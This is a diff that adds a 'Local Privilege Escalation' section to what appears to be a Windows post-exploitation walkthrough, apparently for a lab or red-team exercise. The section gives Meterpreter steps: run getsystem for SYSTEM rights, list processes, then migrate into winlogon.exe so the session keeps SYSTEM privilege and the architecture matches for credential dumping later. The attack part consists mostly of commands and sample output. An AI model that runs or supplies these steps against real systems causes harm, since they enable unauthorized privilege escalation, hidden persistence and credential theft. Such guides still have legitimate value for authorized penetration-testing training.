@@ -65,4 +65,43 @@ whoami /groups
 net view /all
 ```
 
+##Local Privilege Escalation
+
+The fourth group of tasks starts with becoming SYSTEM run the following in your meterpreter session:
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+meterpreter > getsystem 
+```
+
+After becoming system target a process to inject into, a good recommendation is winlogon.exe as it keeps SYSTEM priv and will stay active as well as make sure you are running a compatible architechure for dumping credentials later.
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+(List Processes with ps)
+
+meterpreter > ps
+```
+Pick a process that has SYSTEM and is x64
+
+```
+Process List
+============
+
+ PID   PPID  Name                         Arch  Session  User                          Path
+ ---   ----  ----                         ----  -------  ----                          ----
+
+812   708   winlogon.exe                 x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
+```
+
+(Example winlogon.exe)
+
+Run migrate with process id of target
+```
+meterpreter > migrate 812
+[*] Migrating from 7236 to 812...
+[*] Migration completed successfully.
+```
 
